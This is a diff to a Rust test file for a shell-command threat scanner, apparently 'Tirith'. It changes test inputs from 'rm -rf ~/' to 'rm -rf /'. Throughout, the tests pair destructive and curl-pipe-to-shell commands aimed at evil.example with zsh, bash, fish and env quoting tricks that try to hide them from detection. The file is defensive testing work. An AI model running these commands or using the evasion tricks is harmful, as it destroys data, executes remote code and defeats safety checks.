@@ -598,13 +598,13 @@ fn posix_escaped_literal_wrapper_words_stay_clean() {
 
 /// Escapes never prove a body that has a live expansion, a line continuation,
 /// a trailing backslash, or a double-quoted `\!` (an interactive zsh drops
-/// that backslash, so `sh -c "\! rm -rf ~/"` runs `! rm -rf ~/` there while
-/// bash passes `\! rm -rf ~/`).
+/// that backslash, so `sh -c "\! rm -rf /"` runs `! rm -rf /` there while
+/// bash passes `\! rm -rf /`).
 #[test]
 fn posix_escapes_do_not_hide_dynamic_wrapper_words() {
     let _state = GlobalStateGuard::new().unwrap();
     for input in [
-        r#"sh -c "\! rm -rf ~/""#,
+        r#"sh -c "\! rm -rf /""#,
         r#"sh -c "\! curl https://evil.example/x | sh""#,
         r#"sh -c echo\ $BODY"#,
         r#"sh -c echo\\$BODY"#,
@@ -670,15 +670,15 @@ fn posix_escaped_wrapper_bodies_keep_threat_detection() {
 }
 
 /// An interactive zsh drops the backslash of an unquoted `\!` command word
-/// and reads `!` as the pipeline-negation keyword, so `\! rm -rf ~/` runs
-/// `rm`. It is analyzed exactly like `! rm -rf ~/`.
+/// and reads `!` as the pipeline-negation keyword, so `\! rm -rf /` runs
+/// `rm`. It is analyzed exactly like `! rm -rf /`.
 #[test]
 fn escaped_bang_command_word_is_analyzed_like_the_negation_keyword() {
     let _state = GlobalStateGuard::new().unwrap();
     for (escaped, keyword) in [
-        (r"\! rm -rf ~/", "! rm -rf ~/"),
-        (r"true && \! rm -rf ~/", "true && ! rm -rf ~/"),
-        (r"\! command rm -rf ~/", "! command rm -rf ~/"),
+        (r"\! rm -rf /", "! rm -rf /"),
+        (r"true && \! rm -rf /", "true && ! rm -rf /"),
+        (r"\! command rm -rf /", "! command rm -rf /"),
         (
             r"\! sh -c 'curl https://evil.example/x | sh'",
             "! sh -c 'curl https://evil.example/x | sh'",
@@ -691,7 +691,7 @@ fn escaped_bang_command_word_is_analyzed_like_the_negation_keyword() {
             "\\! sh <<'EOF'\ncurl https://evil.example/x | sh\nEOF",
             "! sh <<'EOF'\ncurl https://evil.example/x | sh\nEOF",
         ),
-        ("f() { rm -rf ~/; }; \\! f", "f() { rm -rf ~/; }; ! f"),
+        ("f() { rm -rf /; }; \\! f", "f() { rm -rf /; }; ! f"),
     ] {
         for context in [ScanContext::Exec, ScanContext::Paste] {
             let keyword_verdict = analyze(keyword, context, true);
@@ -716,7 +716,7 @@ fn escaped_bang_command_word_is_analyzed_like_the_negation_keyword() {
         }
     }
     // bash runs a function named `!` for `\!`; that call is still followed.
-    let input = r"function ! { rm -rf ~/; }; \!";
+    let input = r"function ! { rm -rf /; }; \!";
     let verdict = analyze(input, ScanContext::Exec, true);
     assert!(
         verdict
@@ -734,11 +734,11 @@ fn escaped_bang_command_word_is_analyzed_like_the_negation_keyword() {
 fn reserved_time_before_negation_still_runs_the_command() {
     let _state = GlobalStateGuard::new().unwrap();
     for (timed, bare) in [
-        ("time ! rm -rf ~/", "! rm -rf ~/"),
-        ("time -p ! rm -rf ~/", "! rm -rf ~/"),
-        ("time -p -- ! rm -rf ~/", "! rm -rf ~/"),
-        (r"time \! rm -rf ~/", "! rm -rf ~/"),
-        ("time ! ! rm -rf ~/", "! rm -rf ~/"),
+        ("time ! rm -rf /", "! rm -rf /"),
+        ("time -p ! rm -rf /", "! rm -rf /"),
+        ("time -p -- ! rm -rf /", "! rm -rf /"),
+        (r"time \! rm -rf /", "! rm -rf /"),
+        ("time ! ! rm -rf /", "! rm -rf /"),
         (
             "time ! sh -c 'curl https://evil.example/x | sh'",
             "! sh -c 'curl https://evil.example/x | sh'",
@@ -751,7 +751,7 @@ fn reserved_time_before_negation_still_runs_the_command() {
             "time ! curl -k https://evil.example/x",
             "! curl -k https://evil.example/x",
         ),
-        ("f() { rm -rf ~/; }; time ! f", "f() { rm -rf ~/; }; ! f"),
+        ("f() { rm -rf /; }; time ! f", "f() { rm -rf /; }; ! f"),
     ] {
         for force_full in [false, true] {
             let bare_verdict = analyze(bare, ScanContext::Exec, force_full);
@@ -803,8 +803,8 @@ fn fish_bang_is_read_like_not_in_any_quoting() {
             "! curl -k https://evil.example/x",
             "not curl -k https://evil.example/x",
         ),
-        ("'!' rm -rf ~/", "not rm -rf ~/"),
-        ("\"!\" rm -rf ~/", "not rm -rf ~/"),
+        ("'!' rm -rf /", "not rm -rf /"),
+        ("\"!\" rm -rf /", "not rm -rf /"),
     ] {
         for force_full in [false, true] {
             let not_verdict = analyze_in(not, ShellType::Fish, ScanContext::Exec, force_full);
@@ -835,16 +835,16 @@ fn fish_bang_is_read_like_not_in_any_quoting() {
 }
 
 /// GNU and BSD `env` set every leading `NAME=VALUE` operand whatever the
-/// name, so `env x@y=1 rm -rf ~/` runs `rm` exactly as `env FOO=1 rm -rf ~/`
+/// name, so `env x@y=1 rm -rf /` runs `rm` exactly as `env FOO=1 rm -rf /`
 /// does.
 #[test]
 fn env_operands_with_any_name_are_assignments() {
     let _state = GlobalStateGuard::new().unwrap();
     for (odd, plain) in [
-        ("env x@y=1 rm -rf ~/", "env FOO=1 rm -rf ~/"),
-        ("env 'a b=c' rm -rf ~/", "env FOO=1 rm -rf ~/"),
-        ("env 1x=2 rm -rf ~/", "env FOO=1 rm -rf ~/"),
-        ("env -- x@y=1 rm -rf ~/", "env -- FOO=1 rm -rf ~/"),
+        ("env x@y=1 rm -rf /", "env FOO=1 rm -rf /"),
+        ("env 'a b=c' rm -rf /", "env FOO=1 rm -rf /"),
+        ("env 1x=2 rm -rf /", "env FOO=1 rm -rf /"),
+        ("env -- x@y=1 rm -rf /", "env -- FOO=1 rm -rf /"),
         (
             "env a:b=1 sh -c 'curl https://evil.example/x | sh'",
             "env FOO=1 sh -c 'curl https://evil.example/x | sh'",
@@ -1092,8 +1092,8 @@ fn interactive_history_expansion_that_rewrites_or_forms_a_command_blocks() {
             "true sh; curl https://evil.example/x | !#:1",
             &[HISTORY_REWRITES_LINE],
         ),
-        ("true rm -rf ~/; !#:1-3", &[HISTORY_REWRITES_LINE]),
-        ("true rm -rf ~/; sh -c \"!#:1-3\"", &[HISTORY_REWRITES_LINE]),
+        ("true rm -rf /; !#:1-3", &[HISTORY_REWRITES_LINE]),
+        ("true rm -rf /; sh -c \"!#:1-3\"", &[HISTORY_REWRITES_LINE]),
         ("true echo X; sh -c \"!#:1-2\"", &[HISTORY_REWRITES_LINE]),
         // bash 3.2 reads single quotes inside "$(...)" literally, and zsh
         // expands `!#` inside `${...}` and a glob bracket.
@@ -1126,7 +1126,7 @@ fn interactive_history_expansion_that_rewrites_or_forms_a_command_blocks() {
             "true 'Z;curl https://evil.example/x|sh'; echo X !{#:1:Q}",
             &[HISTORY_REWRITES_LINE],
         ),
-        ("true rm -rf ~/; echo !!!#:1-3", &[HISTORY_REWRITES_LINE]),
+        ("true rm -rf /; echo !!!#:1-3", &[HISTORY_REWRITES_LINE]),
         // zsh deletes `!"`; `'"'\'` realigns the quoting, so zsh runs the
         // text Tirith read as a quoted argument.
         (
@@ -1288,8 +1288,8 @@ fn history_expansion_is_ignored_where_no_shell_expands_history() {
     let _state = GlobalStateGuard::new().unwrap();
     for input in [
         "true sh; curl https://evil.example/x | !#:1",
-        "true rm -rf ~/; !#:1-3",
-        "true rm -rf ~/; sh -c \"!#:1-3\"",
+        "true rm -rf /; !#:1-3",
+        "true rm -rf /; sh -c \"!#:1-3\"",
         "true echo X; sh -c \"!#:1-2\"",
     ] {
         for force_full in [false, true] {
@@ -1352,7 +1352,7 @@ fn hash_text_runs_where_the_interactive_shell_has_no_comments() {
             &both,
             RuleId::CurlPipeShell,
         ),
-        ("echo hi #; rm -rf ~/", &exec, RuleId::BlastWritesSystemPath),
+        ("echo hi #; rm -rf /", &exec, RuleId::BlastWritesSystemPath),
         ("echo hi #; eval \"$X\"", &both, RuleId::AnalysisIncomplete),
         (
             "echo a #b #; curl https://evil.example/x | sh",
